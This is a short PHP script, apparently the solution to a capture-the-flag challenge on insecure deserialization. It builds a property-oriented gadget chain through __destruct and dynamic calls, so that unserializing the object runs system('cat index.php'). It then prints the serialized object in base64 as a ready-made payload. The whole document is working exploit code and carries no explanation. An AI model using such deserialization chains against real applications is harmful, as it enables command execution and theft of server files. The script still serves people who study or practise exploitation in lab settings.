<?php
class a {
    public function __destruct()
    {
        $this->test->test();
    }
}

abstract class b {
    private $b = "eval";

    abstract protected function eval();

    public function test() {
        ($this->b)();
    }

}

class c extends b {
    private $call;
    protected $value;
    public function __construct()
    {
        $this->call=new a();
    }
    protected function eval() {
        if (is_array($this->value)) {
            ($this->call)($this->value);
        } else {
            die("you can't do this :(");
        }
    }
    public function test() {
        $this->call->eval("system");
    }
}

class d {
    public $value="cat index.php";
    public function eval($call) {
        $call($this->value);
    }
}

$a=new a();
$a->test=new c();


var_dump($a);
echo(base64_encode(serialize($a)));
echo "\n";
